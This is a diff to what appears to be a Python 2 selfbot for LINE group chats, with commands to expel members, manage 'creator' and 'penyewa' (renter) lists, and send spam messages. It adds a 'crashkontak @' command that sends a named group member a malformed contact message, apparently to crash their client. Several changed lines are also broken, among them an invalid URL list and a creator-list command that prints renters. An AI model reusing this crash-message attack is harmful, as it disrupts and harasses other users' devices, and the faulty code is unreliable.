@@ -125,8 +125,6 @@ demotedMessage= """\n
  |╬| Expel on @
  |╬| Expel staff @
  |╬| Add staff @
- |╬| Expel creator @
- |╬| Add creator @
  |╬| Expelal
 ═╬════════►∆∆
 """
@@ -534,9 +532,9 @@ wait = {
     "Backup":True,
     "protectionOn":False,
     "atjointicket":True,
-    "Pap":"https://i.imgflip.com/1bqcxs.jpg",
+    "Pap":"https://i.imgflip.com/1bqcxs.jpg","http://kucingpedia.com/wp-content/uploads/2016/06/Gambar-Kucing-Gemuk-Lucu.jpg","https://cdn.brilio.net/news/2015/06/23/6759/750xauto-25-meme-kucing-yang-imut-ngegemesin-dan-bikin-ketawa-150623c.jpg","https://cdn.brilio.net/news/2015/06/23/6759/21164-meme-kucing-7-9.jpg","http://m.memegen.com/kccbqe.jpg","https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ--0ihgvcclOlusyzB1I2pVfenjEfkA7emCu_NR-atnyDlLbh0"
     "SetKey":".",
-    "spam":"Your Account Has Been Spammed",
+    "spam":"ALLAHU LAA ILAAHA ILLA HUWAL HAYYUL QAYYUMU. LAA TA'KHUDZUHUU SINATUW WA LAA NAUUM. LAHUU MAA FISSAMAAWAATI WA MAA FIL ARDHI. MAN DZAL LADZII YASFA'U 'INDAHUU ILLAA BI IDZNIHI. YA'LAMU MAA BAINA AIDIIHIM WA MAA KHALFAHUM. WA LAA YUHITHUUNA BI SYAI-IN MIN 'ILMIHII ILLAA BI MAASYAA-A. WASI'A KURSIYYUHUSSAMAAWAATI WAL ARDHA. WA LAA YA-UDHUU HIFZHUHUMAA WAHUWAL 'ALIYYUL AZHIIM",
     }
 
 wait2 = {
@@ -5262,7 +5260,7 @@ def bot(op):
                 cl.sendText(msg.to,"Pap Has Ben Set To")
 
 	    elif msg.text in [".Pap","Pap"]:
-                cl.sendImageWithURL(msg.to,wait["Pap"])
+                cl.sendImageWithURL(msg.to,random.choice(wait["Pap"]))
 				    
 	    elif "Vn" in msg.text:
                 say = msg.text.replace("Vn","")
@@ -5389,14 +5387,28 @@ def bot(op):
                         for target in targets:
                             try:
                                 peminjam.append(target)
-                                cl.sendText(msg.to,"Added to the creator list")
+                                cl.sendText(msg.to,"Added to the penyewa list")
                             except:
                                 pass
                     print "[Command]Staff add executed"
               else:
                     cl.sendText(msg.to,"Command denied.")
                     cl.sendText(msg.to,"Creator permission required.")
-
+            elif "crashkontak @" in msg.text:
+                if msg.from_ in creator + peminjam:
+                    _name = msg.text.replace("crashkontak @","")
+                    _nametarget = _name.rstrip(' ')
+                    gs = cl.getGroup(msg.to)
+                    for g in gs.members:
+                        if _nametarget == g.displayName:
+                            xname = g.displayName + g.mid
+                            xlen = str(len(xname)+1)
+                            msg.contentType = 13
+                            msg.text = 'mid'+xname+''
+                            msg.contentMetadata = {'mid': "u1f41296217e740650e0448b96851a3e2',"}
+                            cl.sendMessage(msg)
+                            cl.sendText("crash kontak selesai")
+                            print " Spammed crash !"
             elif "Expel penyewa @" in msg.text:
               if msg.from_ in creator:	
                     print "[Command]Staff remove executing"
@@ -5413,7 +5425,7 @@ def bot(op):
                         for target in targets:
                             try:
                                 peminjam.remove(target)
-                                cl.sendText(msg.to,"Removed to the creator list")
+                                cl.sendText(msg.to,"Removed to the penyewa list")
                             except:
                                 pass
                     print "[Command]Staff remove executed"
@@ -5426,11 +5438,20 @@ def bot(op):
                 else:
                     cl.sendText(msg.to,"penyewa list: ")
                     mc = ""
-                    for mi_d in creator:
+                    for mi_d in peminjam:
                         mc += "->" +cl.getContact(mi_d).displayName + "\n"
                     cl.sendText(msg.to,mc)
                     print "[Command]Stafflist executed"	
-		
+            elif msg.text in ["Creatlist","list creator"]:
+                if creator == []:
+                    cl.sendText(msg.to,"The creator is empty")
+                else:
+                    cl.sendText(msg.to,"creator list: ")
+                    mc = ""
+                    for mi_d in peminjam:
+                        mc += "->" +cl.getContact(mi_d).displayName + "\n"
+                    cl.sendText(msg.to,mc)
+                    print "[Command]Stafflist executed"			
             elif "Add staff @" in msg.text:
               if msg.from_ in admin + creator + peminjam:	
                     print "[Command]Staff add executing"
